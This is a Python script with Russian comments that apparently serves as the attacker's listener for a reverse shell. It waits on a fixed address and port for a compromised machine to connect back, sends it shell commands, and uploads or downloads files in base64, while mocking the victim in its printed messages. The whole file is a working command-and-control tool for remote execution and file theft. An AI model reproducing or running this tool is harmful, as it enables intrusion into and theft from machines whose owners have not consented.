import socket, json, base64

class Listener:
    def __init__(self, ip, port):
        # 1 - семейство 2 - тип соедение
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # для повторного подключения
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # машина которая принимает(мы)
        listener.bind((ip, port))
        # listener.bind(("172.18.0.2", 810))
        # добавление в очередь
        listener.listen(0)
        print("WAIT")
        # получаем данные из слушателя
        self.connection, address = listener.accept()
        print("LEST GGOOOOOO, Lox is" + str(address))

    # форматируем в  json
    def res_send(self, data):
        js = json.dumps(data)
        self.connection.send(js.encode())
        
    # распаковка все это надо чтобы получать объекты полностью
    def req_answer(self):
        # для добавление к переменной
        js = ""
        # цикл 
        while True:
            # если получили все данные для  чтения
            try:
                js = js + self.connection.recv(1024).decode()
                return json.loads(js)
            # если не все данные
            except ValueError:
                continue
            
    # # распаковка все это надо чтобы получать объекты полностью
    # def req_answer(self):
    #     js = self.connection.recv(1024)
    #     if js:
    #         return json.loads(js)
    #     else:
    #         return None
    
    # фун для выпол команды
    def execute_com(self, com):
        self.res_send(com)
        if com == "exit":
            self.connection.close()
            exit()
        return self.req_answer()
        
    # фун для получения и открытия файла(он будет бинарный)
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "Suck)))"
        
    # фун для чтения файлов возможность скачать файл
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

        
    def run(self):
        # цикл для отправки соеденения
        while True:
            # для поля ввода
            com = input(">>").split()
            try:
                if com[0] == "upload":
                    file_com = self.read_file(com[1])
                    com.append(file_com)
                res = self.execute_com(com)
                if com[0] == "download" and "Error" not in res:
                    res = self.write_file(com[1], res)
            except Exception:
                res = "Man, what are fuck?!"
            print(res)
            
my_lis = Listener("172.18.0.2", 810)
my_lis.run()